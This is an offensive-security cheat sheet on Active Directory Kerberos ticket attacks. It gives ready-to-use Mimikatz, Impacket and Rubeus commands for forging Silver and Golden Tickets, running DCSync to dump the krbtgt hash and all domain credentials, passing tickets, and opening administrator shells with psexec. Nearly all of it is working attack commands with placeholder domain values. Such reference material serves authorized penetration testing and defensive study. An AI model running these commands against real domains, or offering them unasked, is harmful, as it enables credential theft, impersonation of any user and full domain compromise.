# Ticket Attacks (Golden / Silver)

### Silver Ticket

Forge a service ticket — Impersonate any user to a specific service

```bash
# Requires: service account NTLM hash, domain SID, target SPN

# Mimikatz:
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:<service_ntlm_hash> /user:administrator /ptt

# Impacket:
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server.domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@server.domain.local
```

---

### Golden Ticket

Forge a TGT using krbtgt hash — Impersonate anyone to any service

```bash
# Requires: krbtgt NTLM hash (from DCSync), domain SID

# Mimikatz:
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /ptt

# Impacket:
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc.domain.local
```

---

### DCSync attack

Replicate credentials from DC — Requires Replicating Directory Changes rights

```bash
# Mimikatz:
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# Impacket (from Linux):
impacket-secretsdump domain.local/admin:'Password1'@$DC_IP
impacket-secretsdump -just-dc domain.local/admin:'Password1'@$DC_IP
```

---

### Pass the Ticket

Use a captured or forged ticket — Inject into current session

```bash
# Mimikatz:
kerberos::ptt ticket.kirbi

# Rubeus:
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Linux:
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain.local/administrator@target.domain.local
```

---
